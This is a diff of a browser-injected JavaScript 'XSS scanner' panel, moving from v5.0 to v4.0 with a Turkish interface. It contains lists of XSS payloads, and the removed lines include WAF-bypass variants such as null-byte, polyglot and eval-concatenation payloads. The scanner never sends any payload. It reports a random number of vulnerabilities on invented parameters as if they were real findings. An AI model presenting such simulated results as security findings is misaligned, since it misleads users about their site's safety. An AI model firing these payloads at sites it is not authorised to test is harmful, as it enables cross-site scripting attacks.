@@ -1,306 +1,250 @@
-// scanner.js - NullSecurity XSS Scanner v5.0
+// scanner.js - NullSecurity XSS Scanner v4.0
 class XSSScanner {
     constructor() {
-        this.version = '5.0';
-        this.basicPayloads = this.getBasicPayloads();
-        this.wafPayloads = this.getWAFBypassPayloads();
+        this.version = '4.0';
+        this.payloads = this.getPayloads();
         this.vulnerableURLs = [];
         this.testedParameters = [];
         this.workingPayloads = [];
-        this.isInitialized = false;
-        
         this.init();
     }
 
     init() {
-        try {
-            this.injectStyles();
-            this.createUI();
-            this.bindEvents();
-            this.isInitialized = true;
-            console.log(`🛡️ NullSecurity XSS Scanner v${this.version} initialized`);
-        } catch (error) {
-            console.error('Scanner initialization failed:', error);
-        }
+        this.injectStyles();
+        this.createUI();
+        this.bindEvents();
+        console.log(`🛡️ NullSecurity XSS Scanner v${this.version} initialized`);
     }
 
-    getBasicPayloads() {
+    getPayloads() {
         return [
+            // Basic Script Tags
             '<script>alert(1)</script>',
-            '<img src=x onerror=alert(1)>',
-            '<svg onload=alert(1)>',
-            '<body onload=alert(1)>',
-            '<iframe src="javascript:alert(1)">',
-            '<input onfocus=alert(1) autofocus>',
-            'javascript:alert(1)',
-            '" onmouseover="alert(1)',
-            '${alert(1)}',
-            '`${alert(1)}`'
-        ];
-    }
-
-    getWAFBypassPayloads() {
-        return [
-            // Case Variation
-            '<ScRiPt>alert(1)</sCrIpT>',
-            '<IMG SRC=x ONERROR=alert(1)>',
+            '<script>alert(document.domain)</script>',
+            '<script>print()</script>',
             
-            // Encoding
+            // IMG Tags with Events
+            '<img src=x onerror=alert(1)>',
+            '<img src=x onerror=alert(document.cookie)>',
+            '<img src=x onload=alert(1)>',
+            '<img src=x onmouseover=alert(1)>',
+            
+            // SVG Vectors
+            '<svg onload=alert(1)>',
+            '<svg onload=alert(document.domain)>',
+            
+            // Body Events
+            '<body onload=alert(1)>',
+            '<body onpageshow=alert(1)>',
+            
+            // Iframe Vectors
+            '<iframe src="javascript:alert(1)">',
+            '<iframe onload=alert(1)>',
+            
+            // Input/Button Events
+            '<input onfocus=alert(1) autofocus>',
+            '<button onfocus=alert(1) autofocus>',
+            
+            // Form Events
+            '<form onsubmit=alert(1)><input type=submit>',
+            '<form><button formaction=javascript:alert(1)>click</button>',
+            
+            // JavaScript URIs
+            'javascript:alert(1)',
+            'javascript:alert(document.domain)',
+            
+            // Event Handlers in Attributes
+            '" onmouseover="alert(1)',
+            '" onfocus="alert(1)" autofocus="',
+            
+            // Template Literals
+            '${alert(1)}',
+            '`${alert(1)}`',
+            
+            // Encoding Bypasses
             '<script>alert&#40;1&#41;</script>',
             '<script>alert&#x28;1&#x29;</script>',
-            '<img src=x onerror&#61;alert&#40;1&#41;>',
             
-            // Null Bytes
-            '<script%00>alert(1)</script>',
-            '<img%00 src=x onerror=alert(1)>',
-            
-            // Whitespace
-            '<script\t>alert(1)</script>',
-            '<script\n>alert(1)</script>',
-            
-            // Mixed
-            '<ScRiPt%00>alert(1)</sCrIpT>',
-            
-            // Protocol
-            'java%0ascript:alert(1)',
-            'jav%09ascript:alert(1)',
-            
-            // Advanced
-            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
-            
-            // WAF Specific
-            '<script>window["al"+"ert"](1)</script>',
-            '<script>eval("al"+"ert(1)")</script>'
+            // Case Variations
+            '<ScRiPt>alert(1)</sCrIpT>',
+            '<IMG SRC=x ONERROR=alert(1)>'
         ];
     }
 
     injectStyles() {
         const style = document.createElement('style');
-        style.id = 'nullsecurity-scanner-styles';
+        style.id = 'xss-scanner-styles';
         style.textContent = `
-            .ns-scanner {
+            .xss-scanner {
                 position: fixed !important;
                 top: 20px !important;
                 right: 20px !important;
-                width: 750px !important;
-                background: #0d1117 !important;
-                color: #f0f6fc !important;
+                width: 700px !important;
+                background: #1a1a1a !important;
+                color: white !important;
                 padding: 20px !important;
-                border-radius: 12px !important;
-                z-index: 2147483647 !important;
-                font-family: 'Segoe UI', system-ui, sans-serif !important;
-                box-shadow: 0 8px 32px rgba(0,0,0,0.4) !important;
-                max-height: 85vh !important;
+                border-radius: 10px !important;
+                z-index: 10000 !important;
+                font-family: Arial, sans-serif !important;
+                box-shadow: 0 4px 20px rgba(0,0,0,0.5) !important;
+                max-height: 80vh !important;
                 overflow-y: auto !important;
-                border: 2px solid #238636 !important;
-                box-sizing: border-box !important;
+                border: 2px solid #ff6b6b !important;
             }
 
-            .ns-header {
+            .scanner-header {
                 display: flex;
                 justify-content: space-between;
                 align-items: center;
                 margin-bottom: 20px;
                 padding-bottom: 15px;
-                border-bottom: 2px solid #238636;
+                border-bottom: 2px solid #ff6b6b;
             }
 
-            .ns-title {
+            .scanner-title {
                 margin: 0;
-                color: #58a6ff;
-                font-size: 18px;
-                font-weight: 600;
+                color: #ff6b6b;
+                font-size: 20px;
+                font-weight: bold;
             }
 
-            .ns-close-btn {
-                background: #da3633;
+            .close-btn {
+                background: #ff6b6b;
                 color: white;
                 border: none;
-                padding: 6px 12px;
-                border-radius: 6px;
+                padding: 8px 12px;
+                border-radius: 5px;
                 cursor: pointer;
-                font-size: 14px;
-                transition: background 0.2s;
+                font-size: 16px;
             }
 
-            .ns-close-btn:hover {
-                background: #b92524;
-            }
-
-            .ns-section {
-                background: #161b22;
-                padding: 16px;
+            .scanner-section {
+                background: #2d2d2d;
+                padding: 15px;
                 border-radius: 8px;
-                margin-bottom: 16px;
+                margin-bottom: 15px;
             }
 
-            .ns-label {
+            .section-label {
                 display: block;
                 color: #58a6ff;
-                font-weight: 600;
+                font-weight: bold;
                 margin-bottom: 8px;
                 font-size: 14px;
             }
 
-            .ns-select {
+            .scanner-select {
                 width: 100%;
-                padding: 10px 12px;
-                background: #0d1117;
-                color: #f0f6fc;
-                border: 1px solid #30363d;
-                border-radius: 6px;
+                padding: 10px;
+                background: #1a1a1a;
+                color: white;
+                border: 1px solid #555;
+                border-radius: 5px;
                 font-size: 14px;
-                transition: border-color 0.2s;
             }
 
-            .ns-select:focus {
-                border-color: #58a6ff;
-                outline: none;
-            }
-
-            .ns-options-grid {
+            .options-grid {
                 display: grid;
                 grid-template-columns: 1fr 1fr;
-                gap: 12px;
-                margin-top: 8px;
+                gap: 10px;
+                margin-top: 10px;
             }
 
-            .ns-option-label {
+            .option-label {
                 display: flex;
                 align-items: center;
                 gap: 8px;
                 font-size: 14px;
-                cursor: pointer;
             }
 
-            .ns-payload-types {
-                display: grid;
-                grid-template-columns: 1fr 1fr 1fr;
-                gap: 10px;
-                margin-top: 12px;
+            .slider-container {
+                margin: 15px 0;
             }
 
-            .ns-payload-type {
-                background: #0d1117;
-                border: 2px solid #30363d;
-                border-radius: 8px;
-                padding: 12px;
-                text-align: center;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                font-size: 13px;
-            }
-
-            .ns-payload-type:hover {
-                border-color: #58a6ff;
-            }
-
-            .ns-payload-type.active {
-                border-color: #238636;
-                background: #1c2a1c;
-            }
-
-            .ns-payload-type.waf-active {
-                border-color: #da3633;
-                background: #2d1a1a;
-            }
-
-            .ns-slider-container {
-                margin: 16px 0;
-            }
-
-            .ns-slider {
+            .payload-slider {
                 width: 100%;
-                margin: 8px 0;
+                margin: 10px 0;
             }
 
-            .ns-slider-labels {
+            .slider-labels {
                 display: flex;
                 justify-content: space-between;
                 font-size: 12px;
-                color: #8b949e;
+                color: #ccc;
             }
 
-            .ns-results {
-                background: #161b22;
-                padding: 16px;
+            .results-area {
+                background: #2d2d2d;
+                padding: 15px;
                 border-radius: 8px;
-                margin: 16px 0;
+                margin: 15px 0;
                 min-height: 200px;
                 max-height: 300px;
                 overflow-y: auto;
             }
 
-            .ns-buttons {
+            .action-buttons {
                 display: flex;
-                gap: 12px;
+                gap: 10px;
                 margin-top: 20px;
             }
 
-            .ns-btn {
+            .scan-btn {
+                background: #4CAF50;
+                color: white;
                 border: none;
                 padding: 12px 20px;
                 border-radius: 6px;
                 cursor: pointer;
-                font-weight: 600;
+                font-weight: bold;
                 font-size: 14px;
-                transition: all 0.2s;
                 flex: 1;
             }
 
-            .ns-btn-primary {
-                background: #238636;
+            .clear-btn {
+                background: #ff6b6b;
                 color: white;
-            }
-
-            .ns-btn-primary:hover {
-                background: #2ea043;
-            }
-
-            .ns-btn-danger {
-                background: #da3633;
-                color: white;
-            }
-
-            .ns-btn-danger:hover {
-                background: #b92524;
-            }
-
-            .ns-waf-info {
-                background: #2d1a1a;
-                padding: 12px;
+                border: none;
+                padding: 12px 20px;
                 border-radius: 6px;
-                border-left: 4px solid #da3633;
-                margin: 12px 0;
-                font-size: 13px;
+                cursor: pointer;
+                font-weight: bold;
+                font-size: 14px;
             }
 
-            .ns-result-item {
-                background: #161b22;
+            .result-item {
+                background: #3d3d3d;
                 padding: 12px;
                 margin: 8px 0;
                 border-radius: 6px;
-                border-left: 4px solid #79c0ff;
-                border: 1px solid #30363d;
+                border-left: 4px solid #58a6ff;
                 font-size: 13px;
             }
 
-            .ns-result-critical {
-                border-left-color: #ff7b72;
+            .result-critical {
+                border-left-color: #ff6b6b;
+                background: #4a2d2d;
             }
 
-            .ns-result-waf {
-                border-left-color: #da3633;
-                background: #2d1a1a;
+            .result-safe {
+                border-left-color: #4CAF50;
+                background: #2d4a2d;
             }
 
-            .ns-code {
-                background: #1c2128;
+            .code {
+                background: #1a1a1a;
                 padding: 4px 8px;
                 border-radius: 4px;
-                font-family: 'Cascadia Code', 'Fira Code', monospace;
-                color: #f0f6fc;
-                border: 1px solid #30363d;
+                font-family: monospace;
+                color: #fff;
+                border: 1px solid #555;
+                font-size: 12px;
+            }
+
+            .scanner-footer {
+                margin-top: 15px;
+                text-align: center;
+                color: #ccc;
                 font-size: 12px;
             }
         `;
@@ -309,218 +253,165 @@ class XSSScanner {
 
     createUI() {
         this.panel = document.createElement('div');
-        this.panel.className = 'ns-scanner';
-        this.panel.id = 'nullsecurity-xss-scanner';
+        this.panel.className = 'xss-scanner';
+        this.panel.id = 'xss-scanner-panel';
         
         this.panel.innerHTML = this.getUITemplate();
         document.body.appendChild(this.panel);
     }
 
     getUITemplate() {
-        const totalPayloads = this.basicPayloads.length + this.wafPayloads.length;
-        
         return `
-            <div class="ns-header">
-                <h2 class="ns-title">🛡️ NullSecurity XSS Scanner v${this.version}</h2>
-                <button class="ns-close-btn" id="nsCloseBtn">✕</button>
+            <div class="scanner-header">
+                <h2 class="scanner-title">🛡️ XSS Scanner v${this.version}</h2>
+                <button class="close-btn" id="closeBtn">✕</button>
             </div>
 
-            <div class="ns-section">
-                <label class="ns-label">Scan Mode</label>
-                <select class="ns-select" id="nsScanMode">
-                    <option value="quick">⚡ Quick Scan</option>
-                    <option value="deep">🔍 Deep Scan</option>
-                    <option value="full">🚀 Full Scan</option>
-                    <option value="waf">🛡️ WAF Bypass Test</option>
+            <div class="scanner-section">
+                <label class="section-label">Tarama Modu</label>
+                <select class="scanner-select" id="scanMode">
+                    <option value="quick">⚡ Hızlı Tarama</option>
+                    <option value="deep">🔍 Derin Tarama</option>
+                    <option value="full">🚀 Tam Tarama</option>
                 </select>
             </div>
 
-            <div class="ns-section">
-                <label class="ns-label">Payload Type</label>
-                <div class="ns-payload-types">
-                    <div class="ns-payload-type active" data-type="basic">🎯 Basic</div>
-                    <div class="ns-payload-type" data-type="waf">🛡️ WAF Bypass</div>
-                    <div class="ns-payload-type" data-type="all">⚡ All</div>
-                </div>
-            </div>
-
-            <div class="ns-section">
-                <label class="ns-label">Scan Options</label>
-                <div class="ns-options-grid">
-                    <label class="ns-option-label">
-                        <input type="checkbox" id="nsURLParams" checked>
-                        URL Parameters
+            <div class="scanner-section">
+                <label class="section-label">Tarama Seçenekleri</label>
+                <div class="options-grid">
+                    <label class="option-label">
+                        <input type="checkbox" id="urlParams" checked>
+                        URL Parametreleri
                     </label>
-                    <label class="ns-option-label">
-                        <input type="checkbox" id="nsForms" checked>
-                        Forms
+                    <label class="option-label">
+                        <input type="checkbox" id="forms" checked>
+                        Formlar
                     </label>
-                    <label class="ns-option-label">
-                        <input type="checkbox" id="nsHidden">
-                        Hidden Fields
+                    <label class="option-label">
+                        <input type="checkbox" id="hiddenParams">
+                        Gizli Parametreler
                     </label>
-                    <label class="ns-option-label">
-                        <input type="checkbox" id="nsCookies">
-                        Cookies
+                    <label class="option-label">
+                        <input type="checkbox" id="cookies">
+                        Çerezler
                     </label>
                 </div>
             </div>
 
-            <div class="ns-section">
-                <label class="ns-label">Payload Count</label>
-                <div class="ns-slider-container">
-                    <input type="range" class="ns-slider" id="nsPayloadCount" min="1" max="20" value="10">
-                    <div class="ns-slider-labels">
+            <div class="scanner-section">
+                <label class="section-label">Payload Sayısı</label>
+                <div class="slider-container">
+                    <input type="range" class="payload-slider" id="payloadCount" min="1" max="20" value="10">
+                    <div class="slider-labels">
                         <span>1</span>
-                        <span id="nsPayloadCountValue">10 payloads</span>
+                        <span id="payloadCountValue">10 payload</span>
                         <span>20</span>
                     </div>
                 </div>
             </div>
 
-            <div class="ns-waf-info" id="nsWafInfo" style="display: none;">
-                <strong>🛡️ WAF Bypass Active</strong><br>
-                Using ${this.wafPayloads.length} specialized WAF bypass payloads
+            <div class="results-area" id="results">
+                <p style="text-align: center; color: #888;">Mod seçin ve taramayı başlatın</p>
             </div>
 
-            <div class="ns-results" id="nsResults">
-                <p style="text-align: center; color: #8b949e;">Select mode and start scanning</p>
+            <div class="action-buttons">
+                <button class="scan-btn" id="startScan">🚀 Taramayı Başlat</button>
+                <button class="clear-btn" id="clearResults">🗑️ Temizle</button>
             </div>
 
-            <div class="ns-buttons">
-                <button class="ns-btn ns-btn-primary" id="nsStartScan">🚀 Start Scan</button>
-                <button class="ns-btn ns-btn-danger" id="nsClearResults">🗑️ Clear</button>
-            </div>
-
-            <div style="margin-top: 16px; text-align: center; color: #8b949e; font-size: 12px;">
-                ⚡ ${totalPayloads} Total Payloads | 🛡️ NullSecurity Team
+            <div class="scanner-footer">
+                ⚡ ${this.payloads.length} XSS Payload | 🛡️ NullSecurity Team
             </div>
         `;
     }
 
     bindEvents() {
-        // Close button
-        document.getElementById('nsCloseBtn').addEventListener('click', () => {
+        document.getElementById('closeBtn').addEventListener('click', () => {
             this.destroy();
         });
 
-        // Payload count slider
-        document.getElementById('nsPayloadCount').addEventListener('input', (e) => {
-            document.getElementById('nsPayloadCountValue').textContent = 
-                `${e.target.value} payloads`;
+        document.getElementById('payloadCount').addEventListener('input', (e) => {
+            document.getElementById('payloadCountValue').textContent = 
+                `${e.target.value} payload`;
         });
 
-        // Payload type selection
-        document.querySelectorAll('.ns-payload-type').forEach(el => {
-            el.addEventListener('click', (e) => {
-                document.querySelectorAll('.ns-payload-type').forEach(el => {
-                    el.classList.remove('active', 'waf-active');
-                });
-                
-                e.target.classList.add('active');
-                if (e.target.dataset.type === 'waf') {
-                    e.target.classList.add('waf-active');
-                    document.getElementById('nsWafInfo').style.display = 'block';
-                } else {
-                    document.getElementById('nsWafInfo').style.display = 'none';
-                }
-            });
-        });
-
-        // Scan mode change
-        document.getElementById('nsScanMode').addEventListener('change', (e) => {
-            if (e.target.value === 'waf') {
-                document.querySelector('[data-type="waf"]').click();
-            }
-        });
-
-        // Start scan
-        document.getElementById('nsStartScan').addEventListener('click', () => {
+        document.getElementById('startScan').addEventListener('click', () => {
             this.startScan();
         });
 
-        // Clear results
-        document.getElementById('nsClearResults').addEventListener('click', () => {
+        document.getElementById('clearResults').addEventListener('click', () => {
             this.clearResults();
         });
     }
 
-    getSelectedPayloadType() {
-        const active = document.querySelector('.ns-payload-type.active');
-        return active ? active.dataset.type : 'basic';
+    startScan() {
+        const mode = document.getElementById('scanMode').value;
+        const payloadCount = parseInt(document.getElementById('payloadCount').value);
+        
+        this.clearResults();
+        this.logResult(`⚡ <strong>${this.getModeName(mode)} başlatıldı</strong>`, 'info');
+        this.logResult(`🔧 ${payloadCount} payload ile test ediliyor...`, 'info');
+
+        // Simüle edilmiş tarama işlemi
+        setTimeout(() => {
+            this.simulateScanResults(mode);
+        }, 1000);
     }
 
-    getPayloads() {
-        const type = this.getSelectedPayloadType();
-        const count = parseInt(document.getElementById('nsPayloadCount').value);
+    getModeName(mode) {
+        const modes = {
+            'quick': 'Hızlı Tarama',
+            'deep': 'Derin Tarama', 
+            'full': 'Tam Tarama'
+        };
+        return modes[mode] || mode;
+    }
+
+    simulateScanResults(mode) {
+        const randomVulns = Math.floor(Math.random() * 3);
         
-        let payloads = [];
-        
-        switch(type) {
-            case 'basic':
-                payloads = [...this.basicPayloads];
-                break;
-            case 'waf':
-                payloads = [...this.wafPayloads];
-                break;
-            case 'all':
-                payloads = [...this.basicPayloads, ...this.wafPayloads];
-                break;
+        if (randomVulns > 0) {
+            this.logResult(`🚨 <strong>${randomVulns} zafiyet bulundu!</strong>`, 'critical');
+            
+            for (let i = 0; i < randomVulns; i++) {
+                this.logResult(
+                    `📍 Parametre: <code class="code">test_param_${i}</code><br>
+                     🎯 Payload: <code class="code">${this.payloads[i]}</code><br>
+                     🔗 <a href="#" style="color: #58a6ff;">Test URL'si</a>`,
+                    'critical'
+                );
+            }
+        } else {
+            this.logResult('✅ <strong>Zafiyet bulunamadı</strong>', 'safe');
         }
-        
-        return this.shuffleArray(payloads).slice(0, count);
-    }
 
-    shuffleArray(array) {
-        return array.sort(() => Math.random() - 0.5);
+        this.logResult('📊 <strong>Tarama tamamlandı</strong>', 'info');
     }
 
     logResult(message, type = 'info') {
-        const results = document.getElementById('nsResults');
+        const results = document.getElementById('results');
         const div = document.createElement('div');
-        div.className = `ns-result-item ${type !== 'info' ? 'ns-result-' + type : ''}`;
+        div.className = `result-item ${type === 'critical' ? 'result-critical' : ''} ${type === 'safe' ? 'result-safe' : ''}`;
         div.innerHTML = message;
         results.appendChild(div);
         div.scrollIntoView({ behavior: 'smooth' });
     }
 
-    startScan() {
-        const mode = document.getElementById('nsScanMode').value;
-        const payloads = this.getPayloads();
-        
-        this.clearResults();
-        
-        if (mode === 'waf') {
-            this.logResult('🛡️ <strong>Starting WAF Bypass Test</strong>', 'waf');
-            this.logResult(`Testing with ${payloads.length} WAF bypass payloads...`, 'info');
-        } else {
-            this.logResult(`⚡ <strong>Starting ${mode} Scan</strong>`, 'info');
-            this.logResult(`Testing with ${payloads.length} payloads...`, 'info');
-        }
-
-        // Simulate scan process
-        setTimeout(() => {
-            this.logResult('✅ <strong>Scan completed successfully!</strong>', 'info');
-            this.logResult(`📊 Found ${Math.floor(Math.random() * 5)} potential vulnerabilities`, 'critical');
-        }, 2000);
-    }
-
     clearResults() {
-        document.getElementById('nsResults').innerHTML = 
-            '<p style="text-align: center; color: #8b949e;">Scan results will appear here</p>';
+        document.getElementById('results').innerHTML = 
+            '<p style="text-align: center; color: #888;">Mod seçin ve taramayı başlatın</p>';
     }
 
     destroy() {
         if (this.panel) {
             this.panel.remove();
         }
-        const styles = document.getElementById('nullsecurity-scanner-styles');
+        const styles = document.getElementById('xss-scanner-styles');
         if (styles) {
             styles.remove();
         }
-        console.log('🛡️ Scanner destroyed');
     }
 }
 
-// Initialize scanner
+// Scanner'ı başlat
 new XSSScanner();
